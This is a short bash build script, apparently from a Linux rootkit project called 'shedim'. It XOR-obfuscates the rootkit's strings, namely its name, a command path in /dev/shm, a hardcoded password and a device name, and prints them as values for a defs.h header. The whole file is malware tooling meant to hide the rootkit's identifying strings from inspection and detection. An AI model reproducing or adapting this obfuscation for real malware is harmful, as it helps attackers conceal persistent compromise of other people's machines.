#!/bin/env bash

echo "Copy the values into defs.h"
echo "If the script fails run again."
echo -e "===================================\n"

function generate_xor_key() {
	out=`openssl rand $1 | python -c 'import sys;print(sys.stdin.buffer.read())' | cut -d"'" -f2`
	echo "$out"
}

function xor_str() {
	xored=`python - <<EOF
s1="""$1"""
s2="""$2"""
s = [chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2)]
print(''.join(s))
EOF`
	out=`echo $xored | python -c 'import sys;print(sys.stdin.buffer.read())' | cut -d"'" -f2`
	echo $out
}

xor_key_len=12
xor_key=`generate_xor_key $xor_key_len`

rk_name=`xor_str $xor_key "shedim"`
rk_cmd=`xor_str $xor_key "/dev/shm/rk.sh"`
rk_password="passw0rd!"
rk_xor_password=`xor_str $xor_key $rk_password`
rk_device=`xor_str $xor_key "rootkit"`

echo "RK_STR_XOR_KEY => $xor_key"
echo "RK_STR_XOR_KEY_LEN => $xor_key_len"

echo "RK_STR_NAME => $rk_name"
echo "RK_STR_NAME_LEN =>" `echo $rk_name | wc -c`

echo "RK_STR_CMD => $rk_cmd"
echo "RK_STR_CMD_LEN =>" `echo $rk_cmd | wc -c`

echo "RK_STR_PASSWORD => $rk_xor_password"
echo "RK_STR_PASSWORD_LEN =>" `echo $rk_password | wc -c` 

echo "RK_STR_DEVICE_NAME => $rk_device"
echo "RK_STR_DEVICE_NAME_LEN =>" `echo $rk_device | wc -c`
